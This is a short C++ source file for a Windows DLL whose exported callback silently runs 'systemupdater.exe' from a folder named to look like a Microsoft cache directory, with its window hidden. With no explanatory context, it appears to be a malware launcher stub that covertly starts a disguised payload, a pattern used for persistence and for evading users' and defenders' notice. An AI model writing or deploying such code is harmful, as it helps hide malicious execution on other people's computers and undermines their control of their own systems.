#include <windows.h>

extern "C" __declspec(dllexport) void CALLBACK MyFunction(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    WinExec("C:\\ProgramData\\Microsoft\\CacheSync\\systemupdater.exe", SW_HIDE);
}
